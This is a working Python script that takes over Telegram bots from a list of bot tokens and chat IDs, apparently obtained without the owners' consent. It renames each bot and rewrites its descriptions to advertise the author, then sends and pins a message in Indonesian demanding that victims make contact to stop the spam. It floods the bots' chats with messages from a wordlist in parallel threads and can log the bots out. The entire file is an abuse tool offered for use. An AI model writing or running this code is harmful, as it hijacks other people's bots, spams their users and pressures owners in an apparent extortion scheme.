import json
import threading
import time
import random
import requests
from datetime import datetime
import sys
import os

# Config
TargetList = "target.json" #    .txt format: token|id         .json format: [{"token":"xxx","id":"123"}]
timeout = 900 # Timeout 900 seconds = 15 minutes (60 seconds = 1 minutes, 3600 seconds = 1 hours)
looping = 5 # Loop spamming per target

isWordlist = True # spam random word from wordlist, if False then send Single Message
WordList = "word.txt" # .txt format: aaaa\nbbbb                 .json format: ["aaaa","bbbb"]
WordSingle = "𝐒𝐄𝐓𝐄𝐋𝐀𝐇 𝐏𝐄𝐒𝐀𝐍 𝐈𝐍𝐈, 𝐁𝐎𝐓 𝐀𝐍𝐃𝐀 𝐓𝐈𝐃𝐀𝐊 𝐃𝐀𝐏𝐀𝐓 𝐌𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐏𝐄𝐒𝐀𝐍 𝐀𝐏𝐀𝐏𝐔𝐍.\n𝐇𝐔𝐁𝐔𝐍𝐆𝐈 𝐒𝐀𝐘𝐀 𝐉𝐈𝐊𝐀 𝐈𝐍𝐆𝐈𝐍 𝐃𝐈𝐀𝐊𝐓𝐈𝐅𝐊𝐀𝐍 𝐊𝐄𝐌𝐁𝐀𝐋𝐈.\n【 💀 t.me/xTwnk 💀 】" # Send Single Message then logout

isFirstMessage = True # Send Different Message for the first message's
isFirstMessageImage = True
firstMessage = "【 💀 𝐁𝐎𝐓 𝐀𝐍𝐃𝐀 𝐓𝐄𝐑𝐊𝐄𝐍𝐀 𝐒𝐏𝐀𝐌 💀 】                                 \nBot anda sekarang sedang terkena pesan spamming, apabila anda ingin menghentikan pesan spam tersebut harap hubungi saya\n"
firstMessageImage = 'https://i.imgur.com/sNiTqn1.png'
isPinMessage = True # Pin first message
isUnpinAll = False # Unpin All Message before first Message

isUpdateBot = True # Change Bot Name, Description, Short Description
botNameSet = 'Spammed by @xTwnk'
botDescSet = 'Bxot ini Telah Terkena Spamming oleh @xTwnk silahkan hubungi saya untuk menghentikan'
botShortDescSet = 'Bxot ini Telah Terkena Spamming oleh @xTwnk'

isMarkup = True # Set Markup button for Message
botMarkup = '{"inline_keyboard": [[{ "text": "Hubungi Saya Untuk Menghentikan Spam", "url": "https://t.me/xTwnk" }]]}' # Inline Markup Button

# Function
def getMe(token_info):
    token = token_info["token"]
    url = f'https://api.telegram.org/bot{token}/getme'
    response = requests.get(url)
    return response.json()

def setBot(token_info):
    token = token_info["token"]
    requests.get( f'https://api.telegram.org/bot{token}/setMyName?name={botNameSet}') 
    requests.get( f'https://api.telegram.org/bot{token}/setMyDescription?description={botDescSet}') 
    requests.get( f'https://api.telegram.org/bot{token}/setMyShortDescription?short_description={botShortDescSet}') 

def unpinMessage(token, user_id):
    url = f'https://api.telegram.org/bot{token}/unpinAllChatMessages'
    payload = {
        'chat_id': user_id
    }
    response = requests.get(url, data=payload)
    return response.json()

def pinMessage(token, user_id, chat_id):
    url = f'https://api.telegram.org/bot{token}/pinChatMessage'
    payload = {
        'chat_id': user_id,
        'message_id': chat_id,
        'disable_notification': True
    }
    unpinMessage(token, user_id)
    response = requests.get(url, data=payload)
    return response.json()


def logOut(token):
    url = f'https://api.telegram.org/bot{token}/logOut'
    response = requests.get(url)
    return response.json()

def sendMessage(token, id, text):
    url = f'https://api.telegram.org/bot{token}/sendMessage' 
    if isMarkup == True: 
        payload = {
            'chat_id': id, 
            'text': text, 
            'parse_mode': 'html', 
            "reply_markup": botMarkup
        }
    else:
        payload = {
            'chat_id': id, 
            'text': text, 
            'parse_mode': 'html'
        }
    response = requests.get(url, data=payload)
    return response.json()

def sendImage(token, id, text, image):
    url = f'https://api.telegram.org/bot{token}/sendPhoto'
    if isMarkup == True: 
        payload = {
            'chat_id': id, 
            'photo': image,
            'caption': text,
            "reply_markup": botMarkup
        }
    else:
        payload = {
            'chat_id': id, 
            'photo': image,
            'caption': text,
        }
    response = requests.get(url, data=payload)
    return response.json()

def loadJSON(file):
    with open(file, 'r') as file:
        return json.load(file)

def loadTXT(file, type):
    with open(file, 'r') as file:
        lines = file.readlines()

    return [parseLine(line, type) for line in lines]

def parseLine(line, type):
    if type == 'target':
        token, id = line.strip().split('|')
        return {
            "token": token,
            "id": id
        }
    else:
        return line.strip()


def checkFileType(file):
    _, file_extension = os.path.splitext(file)
    if file_extension.lower() == '.json':
        return 'json'
    elif file_extension.lower() == '.txt':
        return 'txt'

def loadTarget(file):
    if checkFileType(file) == "json":
        target_data = loadJSON(file)
    elif checkFileType(file) == "txt":
        target_data = loadTXT(file, 'target')
    else:
        raise NameError(f"Invalid File Type for {file}")
    
    print("[+]",len(target_data), "Target found, Checking target...")
    count_r = 0
    for i, token_info in enumerate(target_data):
        check_data_target = getMe(token_info)
        if(check_data_target['ok'] == False):
            print(f"[-] [DEAD] [{token_info['token']}]")
            target_data.remove(token_info)
            count_r += 1
        else:
            print(f"[+] [LIVE] [{token_info['token']}] [Username: {check_data_target['result']['username']}] [ID: {check_data_target['result']['id']}]")
    print(f"[-] {count_r} Target removed.")
    return target_data
    
def loadWordlist(file):
    if checkFileType(file) == "json":
        sentences = loadJSON(file)
    elif checkFileType(file) == "txt":
        sentences = loadTXT(file, 'word')
    else:
        raise NameError(f"Invalid File Type for {file}")
    
    print("[+]",len(sentences), "Random word found.")
    return sentences
    
def worker(taskId, tokenInfo):
    token = tokenInfo["token"]
    id = tokenInfo["id"]
    print(f"[+] [{id}] [Task {taskId} started]")
    for i in range(looping):
        if i == 1:
            if isUpdateBot == True:
                setBot(tokenInfo)
                print(f"[+] [{id}] [Task {taskId}] [{i}] Bot's Name, Description and Short Description Changed")
            if isFirstMessage == True:
                if isFirstMessageImage == True:
                    response = sendImage(token, id, firstMessage, firstMessageImage)
                else:
                    response = sendMessage(token, id, firstMessage)
                if(response['ok'] == True):
                    print(f"[+] [{id}] [Task {taskId}] [{i}] [Status: {response['ok']}] [Message ID: {response['result']['message_id']}] [{ datetime.utcfromtimestamp(response['result']['date']).strftime('%H:%M:%S') }]")
                    if isPinMessage == True:
                        pinMessage(token, id, response['result']['message_id'])
                        print(f"[+] [{id}] [Task {taskId}] [{i}] [Message ID: {response['result']['message_id']}] First Message Pinned")
                else:
                    print(f"[-] [{id}] [Task {taskId}] [{i}] [Status: {response['ok']}] [Error Code: {response['error_code']}] [Message: {response['description']}]")
                    if(response['error_code'] == 429):
                        if(response['parameters']['retry_after'] >= timeout):
                            print(f"[-] [{id}] [Task {taskId}] [{i}] Task {taskId} retry exceed Timeout limit, stopping task...")
                            stop_event.set()
                            break

                        print(f"[-] [{id}] [Task {taskId}] [{i}] [Sleeping for {response['parameters']['retry_after']} seconds]")
                        time.sleep(response['parameters']['retry_after'])
                    if(response['error_code'] == 400):
                        print(f"[-] [{id}] [Task {taskId}] [{i}] target logged out, stopping task...")
                        stop_event.set()
                        break  
                    
        else:
            if isWordlist == True:
                text = f"{random.choice(wordlistData)}\n\n\n【 💀 𝐇𝐔𝐁𝐔𝐍𝐆𝐈 𝐒𝐀𝐘𝐀 𝐉𝐈𝐊𝐀 𝐈𝐍𝐆𝐈𝐍 𝐃𝐈𝐇𝐄𝐍𝐓𝐈𝐊𝐀𝐍 𝐒𝐏𝐀𝐌𝐍𝐘𝐀 💀 】"
                response = sendMessage(token, id, text)
                if(response['ok'] == True):
                    print(f"[+] [{id}] [Task {taskId}] [{i}] [Status: {response['ok']}] [Message ID: {response['result']['message_id']}] [{ datetime.utcfromtimestamp(response['result']['date']).strftime('%H:%M:%S') }]")
                    time.sleep(0.5)
                else:
                    print(f"[-] [{id}] [Task {taskId}] [{i}] [Status: {response['ok']}] [Error Code: {response['error_code']}] [Message: {response['description']}]")
                    if(response['error_code'] == 429):
                        if(response['parameters']['retry_after'] >= timeout):
                            print(f"[-] [{id}] [Task {taskId}] [{i}] Task {taskId} retry exceed Timeout limit, stopping task...")
                            stop_event.set()
                            break

                        print(f"[-] [{id}] [Task {taskId}] [{i}] [Sleeping for {response['parameters']['retry_after']} seconds]")
                        time.sleep(response['parameters']['retry_after'])
                    if(response['error_code'] == 400):
                        print(f"[-] [{id}] [Task {taskId}] [{i}] target logged out, stopping task...")
                        stop_event.set()
                        break
            else:
                text = WordSingle
                response = sendMessage(token, id, text)
                if(response['ok'] == True):
                    print(f"[+] [{id}] [Task {taskId}] [{i}] [Status: {response['ok']}] [Message ID: {response['result']['message_id']}] [{ datetime.utcfromtimestamp(response['result']['date']).strftime('%H:%M:%S') }]")
                    logout = logOut(token)
                    print(logout)
                    print(f"[-] [{id}] [Task {taskId}] [{i}] target logged out success, task stopped.")
                    stop_event.set()
                    break  
                else:
                    print(f"[-] [{id}] [Task {taskId}] [{i}] [Status: {response['ok']}] [Error Code: {response['error_code']}] [Message: {response['description']}]")
                    if(response['error_code'] == 429):
                        if(response['parameters']['retry_after'] >= timeout):
                            print(f"[-] [{id}] [Task {taskId}] [{i}] Task {taskId} retry exceed Timeout limit, stopping task...")
                            stop_event.set()
                            break

                        print(f"[-] [{id}] [Task {taskId}] [{i}] [Sleeping for {response['parameters']['retry_after']} seconds]")
                        time.sleep(response['parameters']['retry_after'])
                    if(response['error_code'] == 400):
                        print(f"[-] [{id}] [Task {taskId}] [{i}] target logged out, stopping task...")
                        stop_event.set()
                        break


# MAIN 
def main():
    try:
        print("""
        ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
        █░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
        █░░██████╗░██████╗░██████╗░████████╗███████╗░█████╗░███╗░░░███╗░█
        █░██╔════╝██╔════╝░██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗░████║░█
        █░╚█████╗░██║░░██╗░██████╦╝░░░██║░░░█████╗░░███████║██╔████╔██║░█
        █░░╚═══██╗██║░░╚██╗██╔══██╗░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║░█
        █░██████╔╝╚██████╔╝██████╦╝░░░██║░░░███████╗██║░░██║██║░╚═╝░██║░█
        █░╚═════╝░░╚═════╝░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░█
        █░░░░░░░░░░░░░░░fb.com/twnku░░░░░github.com/twnku░░░░░░░░░░░░░░░█
        █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
        """)
        print(f"[+] Checking Target List File from \"{TargetList}\"...")
        targetData = loadTarget(TargetList)
        global wordlistData
        wordlistData = loadWordlist(WordList)
        threads = []
        global stop_event
        stop_event = threading.Event()

        for i, tokenInfo in enumerate(targetData):
            thread = threading.Thread(target=worker, args=(i+1, tokenInfo))
            threads.append(thread)
            thread.start()


        # Wait for all threads to finish
        for thread in threads:
            thread.join()
        print("[+] All tasks are done.")

    except NameError as error:
        print(f"[x] Something went wrong, {error}")
        sys.exit()

if __name__ == "__main__":
    main()
